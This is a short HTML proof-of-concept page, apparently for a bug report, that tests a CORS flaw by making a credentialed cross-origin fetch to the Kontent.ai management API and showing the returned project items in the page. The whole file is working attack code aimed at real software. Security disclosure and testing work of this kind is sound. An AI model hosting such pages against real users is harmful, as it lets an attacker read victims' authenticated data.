<!DOCTYPE html>
<html>
<head>
  <title>Kontent CORS PoC</title>
</head>
<body>
  <h2>PoC Loaded</h2>
  <pre id="output">Waiting for response...</pre>

  <script>
    fetch("https://manage.kontent.ai/v2/projects/<your_project_id>/items", {
      method: "GET",
      credentials: "include"
    })
    .then(res => res.text())
    .then(data => {
      document.getElementById("output").textContent = data;
    })
    .catch(err => {
      document.getElementById("output").textContent = "Error: " + err;
    });
  </script>
</body>
</html>
